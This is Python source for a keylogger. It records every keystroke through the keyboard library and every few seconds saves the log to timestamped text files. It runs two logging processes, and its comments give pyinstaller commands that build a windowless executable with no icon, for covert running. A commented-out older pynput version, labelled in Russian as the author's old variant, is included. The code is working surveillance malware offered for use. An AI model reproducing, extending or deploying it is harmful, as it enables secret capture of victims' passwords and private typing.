import keyboard
from threading import Timer
from datetime import datetime
import time
import random
import time
from multiprocessing import Process
from pynput.keyboard import Listener
import pyperclip
import threading

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.filename = None
        self.interval = interval
        self.report_method = report_method
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        data_time = time.time()
        self.filename = f"keylog-{data_time}"

    def report_to_file(self):
        if self.log:
            self.log = self.log \
                .replace("[SHIFT]", "")
            with open(f"{self.filename}.txt", "w") as f:
                print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

    def report(self):
        if self.log:
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

def start():
    keylogger = Keylogger(interval=7, report_method="file")
    keylogger.start()

def go():
    Process(target=start, args=()).start()
    Process(target=start, args=()).start()



if __name__ == "__main__":
    go()
    # go()
    # pip install pyinstaller keyboard
    # pyinstaller --onefile -w -i "NONE" keylogger.py

# Мой старый вариант

# # pyinstaller --onefile -w -i "NONE" keylogger.py
# with open('keylog.txt', 'w') as f:
#     f.write("Start of recording\n")
#
#
# def controller(key):
#     file_log = f'keylog.txt'
#     with open(file_log, 'r') as f:
#         data = f.read()
#
#     letter = str(key)
#     letter = letter.replace("'", "")
#
#     if letter == "Key.space":
#         letter = " "
#     if letter == "Key.shift":
#         letter = ""
#     if letter == "Key.backspace":
#         data = data[:-1]
#         letter = ""
#     if letter == "Key.enter":
#         letter = "\n"
#
#     data += letter
#     with open(file_log, 'w') as f:
#         f.write(data)
#
#     # print("WORK")
#
#
# def start():
#     with Listener(on_press=controller) as l:
#         l.join()
#
#
# def go():
#     Process(target=start, args=()).start()
#
# if __name__ == '__main__':
#     print("Hello from main Process")
#     go()
#     go()
